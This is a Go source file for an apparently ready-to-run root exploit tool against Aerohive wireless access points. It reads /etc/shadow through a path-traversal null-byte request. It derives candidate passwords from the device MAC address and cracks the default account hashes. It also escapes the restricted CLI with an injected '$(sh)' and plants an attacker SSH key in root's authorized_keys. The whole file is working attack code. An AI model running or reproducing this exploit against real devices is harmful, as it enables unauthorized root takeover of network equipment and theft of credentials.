package main

import (
	"aerohive-autoroot/pkg/md5crypt"
	"bufio"
	"bytes"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

func check(err error) {
	if err != nil {
		log.Fatal(err)
	}
}

var Address string

func printHelp() {
	fmt.Println("usage: ", filepath.Base(os.Args[0]), "[options] <device ip>")

	fmt.Println("\tGeneral")
	fmt.Println("\t\t--generate <mac>\tGenerate password list for system users, print to stdout")

	fmt.Println("\tModes")
	fmt.Println("\t\t--no-access\tCan connect to the aerohive device, but not login (Default)")
	fmt.Println("\t\t--rcli\t\tRestricted command line access")
	fmt.Printf("\n")

	fmt.Println("\tNo Access Options")
	fmt.Println("\t\t--webport <port>\tThe web server port (Default: 443)")
	fmt.Println("\t\t--readfile <path>\tPath to file to read off the server and print it to STDOUT (disables automatic cracking)")
	fmt.Printf("\n")

	fmt.Println("\tRestricted CLI Access Options")
	fmt.Println("\t\t-u\tCommand line interface username")
	fmt.Println("\t\t-p\tCommand line interface password")
	fmt.Println("\t\t--pubkey <path>\tPath to public key to write to device")

}

func main() {

	mac := flag.String("generate", "", "Generate password list for system users, print to stdout")

	flag.Bool("no-access", true, "If you have cli access set this")
	webport := flag.Int("webport", 443, "The web server port (Default: 443)")
	filePath := flag.String("readfile", "", "Path to file to read off the server and print it to STDOUT")

	flag.Bool("rcli", false, "If you have cli access set this")
	username := flag.String("u", "admin", "Username")
	password := flag.String("p", "aerohive", "Password")
	path := flag.String("pubkey", "", "Path to public key to enable on device")

	flag.Usage = printHelp

	flag.Parse()

	hasCliAccess := false
	generateOnly := false
	readOnly := false
	flag.Visit(func(f *flag.Flag) {
		switch f.Name {
		case "rcli":
			hasCliAccess = true
		case "generate":
			generateOnly = true
		case "readfile":
			readOnly = true
		}
	})

	if generateOnly {
		pwds, err := generatePasswords(*mac)
		check(err)
		for _, v := range pwds {
			fmt.Println(v)
		}
		return
	}

	if len(flag.Args()) != 1 {
		fmt.Println("Missing target")
		printHelp()
		return
	}

	Address = flag.Args()[0]

	if hasCliAccess && (generateOnly || readOnly) {
		log.Fatal("Incompatiable flags")
	}

	if readOnly {

		out, err := readPath(*filePath, *webport)
		if err != nil {
			log.Fatal(err)
		}

		for _, v := range out {
			fmt.Println(v)
		}
		return
	}

	if hasCliAccess {
		if len(*path) == 0 {
			log.Fatal("A public key needs to be specified for this mode (--pubkey path)")
		}

		restrictedShellRoot(*path, *username, *password)
		return
	}

	noAccess(*webport)
}

func noAccess(port int) {
	log.Println("Attempting read file exploit....")
	lines, err := readPath("/etc/shadow", port)
	if err != nil {
		log.Fatalln("Error: ", err)
	}

	type hash struct {
		User string
		Hash []byte
	}

	hashes := []hash{}
	for _, v := range lines {
		if strings.Contains(v, "Aerohive") {
			parts := strings.Split(v, ":")
			if len(parts) > 2 {
				fmt.Println("Hash: ", v)
				hashes = append(hashes, hash{parts[0], []byte(parts[1])})
			} else {
				log.Println("Skipping entry: ", v, " as it hasnt split right")
			}
		}
	}
	if len(hashes) == 0 {
		log.Fatal("No default accounts found in shadow file, failed")
	}

	lines, err = readPath("/f/system_info/hw_info", port)
	if err != nil {
		log.Fatalln("Unable to automatically deterimine mac address")
	}

	var mac string
	for _, v := range lines {
		if strings.Contains(v, "MAC address") {

			mac = strings.TrimSpace(v[strings.Index(v, ":")+1:])
			break
		}
	}

	//Fix their terrible mac format
	mac = mac[:2] + ":" + mac[2:7] + ":" + mac[7:9] + mac[9:12] + ":" + mac[12:]
	fmt.Println("Got mac address as: ", mac)
	fmt.Printf("Generating passwords...")
	passwords, err := generatePasswords(mac)
	check(err)
	fmt.Printf("Done\n")

	//As this has at max 1 million guesess there really isnt much reason to have a stop feature
	var wg sync.WaitGroup
	fmt.Printf("Started thread: ")
	for i := 0; i < 10; i++ { // Make 10 threads and split up the password list between them
		list := make([]string, len(passwords)/10)
		for ii := i; ii < len(passwords); ii += 10 {
			list = append(list, passwords[ii])
		}
		wg.Add(1)
		go func(pwdList []string) {
			for _, v := range pwdList {
				hash := md5crypt.MD5Crypt([]byte(v), []byte(""), []byte("$1$"))
				for _, h := range hashes {
					if bytes.Equal(hash, h.Hash) {
						log.Printf("Found match. Username: %s, Hash: %s, Password: %s\n", h.User, h.Hash, v)
					}
				}
			}
			wg.Done()
		}(list)

		fmt.Printf("%d ", i)
	}
	fmt.Printf("\nCracking...\n")

	wg.Wait()
	log.Println("Finished")

}

func readPath(path string, port int) (s []string, err error) {

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}

	data := strings.NewReader("mac=../../.." + path + "%00")

	resp, err := client.Post("https://"+Address+":"+strconv.Itoa(port)+"/action.php5?_page=Backup&_action=get&name=bloop&debug=true", "application/x-www-form-urlencoded", data)
	if err != nil {
		fmt.Println(err)
		return s, err
	}
	defer resp.Body.Close()

	r := bufio.NewReader(resp.Body)
	for {
		line, err := r.ReadString('\n')
		if err != nil {
			if err != io.EOF {
				return s, err
			}
			break
		}
		s = append(s, strings.TrimSpace(line))
	}

	return s, nil

}

func generatePasswords(mac string) (s []string, err error) {
	hwadd, err := net.ParseMAC(mac)
	if err != nil {
		return s, err
	}

	last := strings.ReplaceAll(hwadd.String(), ":", "")[6:]

	prefix := last[2:4] + last[:2] + last[4:]

	for i := 0; i < 1000000; i++ {
		s = append(s, prefix+strconv.Itoa(i))
	}

	return s, nil
}

func restrictedShellRoot(pubkey, username, password string) {

	fmt.Printf("Accessing restricted shell [username=%s]...", username)
	key, err := ioutil.ReadFile(pubkey)
	check(err)

	config := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: func(hostname string, remote net.Addr, key ssh.PublicKey) error {
			return nil
		},
	}
	client, err := ssh.Dial("tcp", Address, config)
	if err != nil {
		log.Fatal("Failed to dial: ", err)
	}
	defer client.Close()
	fmt.Printf(".")

	// Each ClientConn can support multiple interactive sessions,
	// represented by a Session.
	session, err := client.NewSession()
	if err != nil {
		log.Fatal("Failed to create session: ", err)
	}
	defer session.Close()
	fmt.Printf(".")

	wr, err := session.StdinPipe()
	check(err)

	// Once a Session is created, you can execute a single command on
	// the remote side using the Run method.
	modes := ssh.TerminalModes{
		ssh.ECHO: 0, // disable echoing
	}

	err = session.RequestPty("vt100", 80, 40, modes)
	check(err)

	err = session.Shell()
	check(err)
	fmt.Printf(".Done!\n")
	fmt.Println("Writing commands:")

	_, err = wr.Write([]byte("save web-page web-directory test http://$(sh)\n"))
	check(err)

	cmds := []string{
		"mkdir -p /root/.ssh",
		"chmod 700 /root/.ssh",
		fmt.Sprintf("echo '%s' >> /root/.ssh/authorized_keys", strings.TrimSpace(string(key))),
		"chmod 644 /root/.ssh/authorized_keys",
	}

	for i := range cmds {
		fmt.Println(cmds[i])
		_, err := wr.Write([]byte(cmds[i] + "\n"))
		check(err)
		<-time.After(1 * time.Second)
	}

	fmt.Println("Finished. You should now be able to ssh root@ap")
}
